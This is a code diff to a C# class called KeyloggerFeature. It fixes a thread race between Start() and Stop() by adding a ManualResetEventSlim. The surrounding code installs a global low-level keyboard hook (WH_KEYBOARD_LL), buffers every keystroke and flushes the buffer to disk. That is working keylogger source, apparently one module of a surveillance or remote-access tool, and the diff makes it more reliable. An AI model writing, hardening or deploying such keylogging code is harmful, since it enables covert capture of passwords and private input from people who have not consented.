@@ -70,6 +70,7 @@ internal static class KeyloggerFeature
     private static Thread?       _thread;
     private static volatile bool _running;
     private static uint          _threadId;
+    private static readonly ManualResetEventSlim _threadReady = new(false);
     private static readonly StringBuilder _buf       = new();
     private static readonly object        _bufLock   = new();
     private static readonly object        _startLock = new();
@@ -83,6 +84,7 @@ internal static class KeyloggerFeature
     internal static void Start()
     {
         lock (_startLock) { if (_running) return; _running = true; }
+        _threadReady.Reset();
         _flushTimer.Start();
         _thread = new Thread(HookThread) { IsBackground = true, Name = "KL" };
         _thread.Start();
@@ -93,6 +95,9 @@ internal static class KeyloggerFeature
         lock (_startLock) { if (!_running) return; _running = false; }
         _flushTimer.Stop();
         FlushToDisk();
+        // Wait until HookThread has set _threadId before sending WM_QUIT.
+        // Without this, Stop() racing with Start() would PostThreadMessage(0,...) = no-op.
+        _threadReady.Wait(500);
         if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
         _thread?.Join(3000);
         _thread = null;
@@ -162,6 +167,7 @@ internal static class KeyloggerFeature
     private static unsafe void HookThread()
     {
         _threadId = GetCurrentThreadId();
+        _threadReady.Set();
         var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
         _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);
 
